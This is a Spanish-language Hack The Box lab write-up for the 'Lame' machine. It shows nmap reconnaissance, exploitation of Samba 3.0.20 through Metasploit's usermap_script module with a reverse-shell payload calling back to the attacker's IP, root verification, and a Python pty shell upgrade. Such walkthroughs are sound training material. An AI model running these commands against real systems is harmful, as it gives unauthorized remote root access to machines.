---
title: "Lame: explotación de Samba 3.0.20"
description: "Primera máquina de Hack The Box: reconocimiento, explotación de Samba 3.0.20 con Metasploit y estabilización de la shell."
category: "laboratorios"
draft: false
---

**Plataforma:** Hack The Box · **SO:** Linux · **Dificultad:** Fácil

## Resumen

Lame es la primera máquina de Hack The Box. Tiene un servicio Samba desactualizado (versión 3.0.20) que permite ejecución remota de comandos. Es una buena oportunidad para entender por qué las versiones viejas son peligrosas.

## 1. Reconocimiento

Escaneo de servicios, versiones y scripts predeterminados:

```bash
nmap -sC -sV -T4 -Pn <IP>
```

- `-sC`: ejecuta scripts predeterminados.
- `-sV`: detecta la versión de cada servicio.
- `-T4`: velocidad de escaneo.
- `-Pn`: omite el ping, útil si la máquina no responde a ICMP.

El resultado muestra Samba 3.0.20, un servicio obsoleto.

## 2. Búsqueda del exploit

Con la versión identificada, buscamos un exploit conocido. Podés usar `searchsploit samba 3.0.20` o ir directo a Metasploit.

## 3. Explotación con Metasploit

```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS <IP>
set PAYLOAD cmd/unix/reverse
set LHOST <tu_IP>
run
```

- `use`: selecciona el exploit.
- `set RHOSTS`: IP de la máquina objetivo.
- `set PAYLOAD`: tipo de payload que se ejecuta al explotar.
- `set LHOST`: tu IP, a la que la máquina se conecta de vuelta.
- `run`: lanza el exploit.

## 4. Verificar el acceso

Una vez dentro de la shell, comprobá con qué usuario estás:

```bash
whoami
id
uname -a
```

El resultado muestra que la shell corre con privilegios de root.

## 5. Estabilizar la shell

La shell inicial no es interactiva. Con Python la podés mejorar:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

## Aprendizaje

- Una versión vieja de un servicio conocido puede ser suficiente para comprometer una máquina.
- Escanear versiones (`-sV`) es tan importante como encontrar puertos abiertos.
- Un exploit público no es automático: hay que entender qué hace, qué parámetros necesita y qué acceso da.
